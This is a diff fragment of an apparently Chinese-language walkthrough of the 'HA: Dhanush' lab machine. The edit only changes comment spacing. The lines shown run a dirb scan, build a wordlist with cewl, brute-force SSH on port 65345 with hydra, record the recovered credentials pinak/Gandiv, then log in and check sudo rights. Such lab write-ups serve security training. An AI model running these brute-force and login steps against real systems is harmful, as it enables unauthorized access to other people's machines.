@@ -29,14 +29,14 @@ dirb http://192.168.253.141/
 > **然而并没有发现什么有用的信息,因此怀疑是不是跟SSH有关**
 
 ```
-cewl http://192.168.253.141/ -w 1.txt		# 爬取网站生成字典
+cewl http://192.168.253.141/ -w 1.txt		#爬取网站生成字典
 hydra -L 1.txt -P 1.txt  -vV -e nsr 192.168.253.141 ssh -s 65345 -f
 ```
 
 ![](./img/HA：Dhanush-03.png)
 
 ```
-# username:pinak,password:Gandiv
+#username:pinak,password:Gandiv
 ssh pinak@192.168.253.141 -p 65345
 sudo -l
 ```
